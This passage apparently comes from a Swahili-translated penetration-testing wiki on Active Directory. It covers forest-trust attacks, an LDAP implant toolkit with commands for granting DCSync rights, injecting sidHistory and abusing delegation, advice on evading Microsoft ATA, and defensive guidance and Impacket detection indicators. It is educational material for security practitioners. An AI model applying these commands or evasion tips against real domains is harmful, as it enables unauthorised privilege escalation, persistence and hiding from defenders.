{{#endref}}

Utafiti wa ziada kutoka nje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Shambulio la mabadiliko ya Schema**

Mbinu hii inahitaji subira, kwa kuwa unahitaji kusubiri hadi vitu vipya vya AD vyenye mamlaka ya juu viundwe. Akiwa na SYSTEM privileges, mshambuliaji anaweza kurekebisha AD Schema na kumpa mtumiaji yeyote udhibiti kamili wa madarasa yote. Hili linaweza kusababisha ufikiaji na udhibiti usioidhinishwa wa vitu vipya vya AD vitakavyoundwa.

Maelezo zaidi yanapatikana katika [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Kutoka DA hadi EA kwa kutumia ADCS ESC5**

Athari ya ADCS ESC5 inalenga udhibiti wa vitu vya Public Key Infrastructure (PKI) ili kuunda certificate template inayowezesha uthibitishaji kama mtumiaji yeyote ndani ya forest. Kwa kuwa vitu vya PKI viko katika Configuration NC, kuhatarisha child DC inayoweza kuandikwa huwezesha kutekeleza mashambulizi ya ESC5.

Maelezo zaidi yanapatikana katika [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Katika hali ambapo ADCS haipo, mshambuliaji anaweza kusanidi vipengele vinavyohitajika, kama ilivyojadiliwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Forest Domain ya Nje - One-Way (Inbound) au ya pande mbili

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Katika hali hii, domain yako inaaminiwa na domain ya nje, hivyo unapata ruhusa zisizobainishwa juu yake. Utahitaji kubaini ni principals gani za domain yako zina ufikiaji gani juu ya domain ya nje, kisha ujaribu kuiexploit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain ya Forest ya Nje - One-Way (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Katika hali hii, **domain yako** ndiyo **inayoamini** baadhi ya **privileges** za principal kutoka **domains tofauti**.

Hata hivyo, wakati **domain inayoaminiwa** inaaminika na domain inayoamini, domain inayoaminiwa **huunda user** mwenye **jina linalotabirika** na kutumia password ya trust kama **password**. Hii inamaanisha kuwa inawezekana **kuingia kwenye user wa domain inayoamini ili kuingia kwenye domain inayoaminiwa**, kuichunguza na kujaribu kuongeza privileges zaidi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuingilia domain inayoaminiwa ni kutafuta [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyoundwa **katika mwelekeo ulio kinyume** na trust ya domain (jambo ambalo si la kawaida sana).

Njia nyingine ya kuingilia domain inayoaminiwa ni kusubiri kwenye mashine ambayo **user kutoka domain inayoaminiwa anaweza kufikia** ili kuingia kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code kwenye mchakato wa RDP session na **kufikia domain asili ya victim** kutoka hapo.\
Zaidi ya hayo, ikiwa **victim ali-mount hard drive yake**, mshambuliaji anaweza kuhifadhi **backdoors** kwenye **startup folder ya hard drive** kupitia mchakato wa **RDP session**. Mbinu hii inaitwa **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Kupunguza hatari za matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia sifa ya SID history katika forest trusts hupunguzwa kwa SID Filtering, ambayo huwashwa kwa chaguo-msingi kwenye inter-forest trusts zote. Hii inategemea dhana kwamba intra-forest trusts ni salama, kwa kuichukulia forest, badala ya domain, kama mpaka wa usalama kulingana na msimamo wa Microsoft.
- Hata hivyo, kuna changamoto: SID filtering inaweza kuvuruga applications na ufikiaji wa user, na hivyo wakati mwingine huzimwa.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication huhakikisha kwamba users kutoka forests hizo mbili hawa-authenticatewi kiotomatiki. Badala yake, users lazima wapewe ruhusa wazi ili wafikie domains na servers ndani ya domain au forest inayoamini.
- Ni muhimu kutambua kwamba hatua hizi hazilindi dhidi ya matumizi mabaya ya writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**Taarifa zaidi kuhusu domain trusts kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Matumizi Mabaya ya AD Yanayotegemea LDAP kutoka kwa On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) hutekeleza upya LDAP primitives za mtindo wa bloodyAD kama x64 Beacon Object Files zinazoendeshwa kabisa ndani ya implant iliyo kwenye host (kwa mfano, Adaptix C2). Operators hukompile pack kwa kutumia `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, hupakia `ldap.axs`, kisha kuita `ldap <subcommand>` kutoka kwenye beacon. Trafiki yote hutumia security context ya sasa ya logon kupitia LDAP (389) yenye signing/sealing au LDAPS (636) yenye auto certificate trust, kwa hiyo hakuna haja ya socks proxies au disk artifacts.<sup>[[4]](#references)</sup>

### Uhesabuji wa LDAP upande wa implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, na `get-groupmembers` hubadilisha majina mafupi/njia za OU kuwa DNs kamili na kutoa data ya objects husika.
- `get-object`, `get-attribute`, na `get-domaininfo` huchukua attributes zozote (pamoja na security descriptors) na metadata ya forest/domain kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, na `get-rbcd` huonyesha waathiriwa wanaoweza kushambuliwa kwa roasting, mipangilio ya delegation, na descriptors zilizopo za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) moja kwa moja kutoka LDAP.
- `get-acl` na `get-writable --detailed` huchanganua DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na urithi, na kutoa mara moja malengo ya privilege escalation kupitia ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitives za uandishi za LDAP kwa ajili ya kuongeza mamlaka na persistence

- BOF za kuunda vitu (`add-user`, `add-computer`, `add-group`, `add-ou`) humwezesha operator kuandaa principals au akaunti mpya za mashine popote ambapo kuna ruhusa za OU. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` huteka moja kwa moja malengo mara tu haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` hubadilisha WriteDACL/WriteOwner kwenye kitu chochote cha AD kuwa uwezo wa kuweka upya nywila, kudhibiti uanachama wa makundi, au kupata ruhusa za urudufu za DCSync bila kuacha mabaki ya PowerShell/ADSI. Amri zinazolingana za `remove-*` husafisha ACE zilizoingizwa.

### Delegation, roasting na matumizi mabaya ya Kerberos

- `add-spn`/`set-spn` humfanya papo hapo mtumiaji aliyeathiriwa aweze kulengwa na Kerberoast; `add-asreproastable` (kubadilisha UAC) humwezesha kulengwa na AS-REP roasting bila kugusa nywila.
- Macros za delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) hubadilisha `msDS-AllowedToDelegateTo`, bendera za UAC, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, na kuwezesha njia za mashambulizi za constrained/unconstrained/RBCD bila kuhitaji tena PowerShell ya mbali au RSAT.

### Uingizaji wa sidHistory, kuhamisha OU na kurekebisha sehemu ya mashambulizi

- `add-sidhistory` huingiza SID zenye mamlaka ya juu kwenye historia ya SID ya principal inayodhibitiwa (tazama [Uingizaji wa SID-History](sid-history-injection.md)), na kutoa urithi wa ufikiaji wa siri kupitia LDAP/LDAPS pekee.
- `move-object` hubadilisha DN/OU ya kompyuta au watumiaji, na kumwezesha mshambuliaji kuhamisha rasilimali chini ya haki zilizokabidhiwa kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`. Tazama [Kuhamisha OU na haki zilizorithiwa](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) kwa ruhusa za kuhamisha na ukaguzi wa urithi.
- Amri za uondoaji zenye upeo maalum (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu kurejesha mabadiliko haraka baada ya operator kuvuna vitambulisho au kuweka persistence, na kupunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Baadhi ya Kinga za Jumla

[**Pata maelezo zaidi kuhusu jinsi ya kulinda vitambulisho hapa.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Kinga ya Vitambulisho**

- **Vizuizi kwa Domain Admins**: Inapendekezwa kwamba Domain Admins waruhusiwe kuingia kwenye Domain Controllers pekee, ili kuepuka kuwatumia kwenye host nyingine.
- **Ruhusa za Akaunti za Huduma**: Huduma hazipaswi kuendeshwa kwa ruhusa za Domain Admin (DA) ili kudumisha usalama.
- **Kuwekea Kikomo Muda wa Ruhusa za Juu**: Kwa kazi zinazohitaji ruhusa za DA, muda wake unapaswa kuwekewa kikomo. Hili linaweza kufanywa kwa kutumia: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Kupunguza hatari ya LDAP relay**: Kagua Event ID 2889/3074/3075, kisha utekeleze LDAP signing pamoja na LDAPS channel binding kwenye DC/clients ili kuzuia majaribio ya LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Utambuzi wa alama za kipekee za protocol wa shughuli za Impacket

Ukitaka kugundua mbinu za kawaida za AD, **usitegemee tu mabaki yanayodhibitiwa na operator** kama vile binaries zilizobadilishwa majina, majina ya huduma, faili za muda za batch, au njia za matokeo. Weka msingi wa jinsi clients halali za Windows zinavyounda trafiki ya [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, na WMI, kisha tafuta **sifa za kipekee za utekelezaji** zinazobaki hata baada ya operator kuhariri `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, au `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Viashiria vinavyowezekana sana kuwa vya pekee** (baada ya kuvihakiki dhidi ya baseline yako):
  - DCE/RPC iliyoidhinishwa inayotumia `auth_context_id = 79231 + ctx_id`
  - Padding ya uthibitishaji wa DCE/RPC iliyojaa `0xff`
  - LDAP Kerberos binds zinazoweka Kerberos `AP-REQ` ghafi moja kwa moja ndani ya SPNEGO `mechToken`
  - Maombi ya SMB2/3 negotiate yenye thamani za `ClientGuid` zinazoonekana kuwa ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` inayotumia namespace isiyo ya kawaida `//./root/cimv2`
  - Thamani za Kerberos nonce zilizowekwa moja kwa moja
- **Zitumie vyema kama vipengele vya uhusishaji/ukadiriaji**:
  - Orodha chache au zilizo na marudio za Kerberos etype, `PA-DATA` zisizo za kawaida/zisizokuwepo, au mpangilio wa etype wa TGS-REQ unaotofautiana na Windows asilia
  - Ujumbe wa NTLM Type 1 usio na taarifa za version au ujumbe wa Type 3 wenye majina ya host yasiyo na thamani
  - Raw NTLMSSP iliyobebwa ndani ya DCE/RPC badala ya SPNEGO, kutokuwepo kwa DCE/RPC verification trailers, au kutolingana kwa SPNEGO/Kerberos OID
  - Sifa kadhaa kati ya hizi kutoka kwa host/user/session/kipindi kilekile zina nguvu zaidi kuliko field moja dhaifu
- **Zitumie kama maelezo ya ziada, si arifa za pekee**:
  - Majina ya faili chaguomsingi, njia za matokeo, majina nasibu ya huduma, majina ya muda ya batch, majina chaguomsingi ya akaunti za kompyuta, na string maalum za HTTP/WebDAV/RDP/MSSQL za zana
  - Operator anaweza kuzibadilisha kwa urahisi, kwa hiyo zitumie vyema kueleza kwa nini kundi la shughuli za protocol mbalimbali linatia shaka
- **Vidokezo vya kiutendaji**:
  - Baadhi ya ishara hizi zinahitaji trafiki iliyofunguliwa usimbaji, [uchanganuzi wa PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, au mwonekano wa upande wa huduma
  - Zihakiki dhidi ya clients za Samba/Linux, vifaa maalum, na programu za zamani kabla ya kuzitumia kama arifa
  - Hamisha detections kutoka maelezo ya ziada -> uwindaji -> arifa kadiri unavyojenga imani katika baseline

### **Utekelezaji wa Mbinu za Udanganyifu**

- Utekelezaji wa udanganyifu huhusisha kuweka mitego, kama vile watumiaji au kompyuta za chambo, zenye sifa kama nywila zisizoisha muda wake au zilizowekwa alama ya Trusted for Delegation. Mbinu ya kina inajumuisha kuunda watumiaji wenye haki maalum au kuwaongeza kwenye makundi yenye mamlaka ya juu.<sup>[[2]](#references)</sup>
- Mfano wa vitendo ni kutumia zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maelezo zaidi kuhusu kutumia mbinu za udanganyifu yanapatikana kwenye [Deploy-Deception kwenye GitHub](https://github.com/samratashok/Deploy-Deception).

### **Kutambua Udanganyifu**

- **Kwa Vitu vya Mtumiaji**: Viashiria vya kutiliwa shaka ni pamoja na ObjectSID isiyo ya kawaida, kuingia mara chache, tarehe za kuundwa, na idadi ndogo ya nywila zisizo sahihi.
- **Viashiria vya Jumla**: Kulinganisha sifa za vitu vinavyoweza kuwa vya chambo na sifa za vitu halisi kunaweza kufichua kutolingana. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua udanganyifu huo.

### **Kukwepa Mifumo ya Utambuzi**

- **Kukwepa Utambuzi wa Microsoft ATA**:
  - **Kuhesabu Watumiaji**: Kuepuka kuhesabu session kwenye Domain Controllers ili kuzuia kutambuliwa na ATA.
  - **Kuiga Tiketi**: Kutumia funguo za **aes** kuunda tiketi husaidia kukwepa utambuzi kwa kutoishusha hadi NTLM.
  - **Mashambulizi ya DCSync**: Inashauriwa kutekeleza kutoka kwa mashine isiyo Domain Controller ili kukwepa utambuzi wa ATA, kwa kuwa utekelezaji wa moja kwa moja kutoka kwa Domain Controller utasababisha arifa.

## References

- [1] [Mwongozo wa Kushambulia Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kutengeneza Trusts kwa ajili ya Udanganyifu katika Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Kutoka Domain Admin hadi Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Zana ya LDAP ya Kumbukumbu kwa ajili ya Exploitation ya Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Kutumia Hash za NTLM kama Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Kuchambua Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Kuteka Akaunti za Active Directory kupitia Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jinsi ya kudhibiti mabadiliko katika miunganisho salama ya channel ya Netlogon yanayohusiana na CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Safari ya kuchunguza interfaces za Null Session na MS-RPC zilizosahaulika](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Je, kichujio cha SID ni mpaka wa usalama kati ya domains? (Sehemu ya 4) - Utafiti wa kukwepa uchujaji wa SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Je, kichujio cha SID ni mpaka wa usalama kati ya domains? (Sehemu ya 5) - Shambulio la Golden GMSA trust - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Je, kichujio cha SID ni mpaka wa usalama kati ya domains? (Sehemu ya 6) - Shambulio la trust kupitia mabadiliko ya Schema - kutoka child hadi parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Kutoka DA hadi EA kwa kutumia ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Kupanda kutoka kwa wasimamizi wa child domain hadi enterprise admins ndani ya dakika 5 kwa kutumia vibaya AD CS, mwendelezo](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE ya Akiba: Kubuni Backdoor za Active Directory DACL](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Msimbo chanzo wa moduli ya NetExec pre2k](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - Sifa ya msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
